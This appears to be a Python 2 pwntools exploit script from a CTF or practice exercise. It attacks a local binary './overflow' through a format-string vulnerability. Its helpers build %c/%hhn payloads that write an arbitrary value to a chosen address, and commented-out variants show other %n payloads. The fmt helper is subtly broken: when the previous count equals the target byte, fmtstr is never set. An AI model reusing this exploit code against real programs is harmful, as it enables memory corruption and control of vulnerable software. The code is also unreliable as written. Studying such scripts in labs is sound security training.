from pwn import *

context.log_level = 'debug'
# overwrite big number
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    print prev
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

conn = process('./overflow')

c_addr = int(conn.recvuntil('\n', drop=True),16)
print hex(c_addr)
# overwrite normal number, eg. 16
## payload = p32(c_addr) + '%012d' + '%6$n'

# overwrite small number,eg.  2

# a_addr = 0x804a024
## payload =  'AA%8$nAA' + p32(a_addr)

# fmt_str(offset,size,addr,target)
payload = fmt_str(6,4,0x0804A028,0x12345678)
print payload

conn.sendline(payload)
print conn.recv()
conn.interactive()
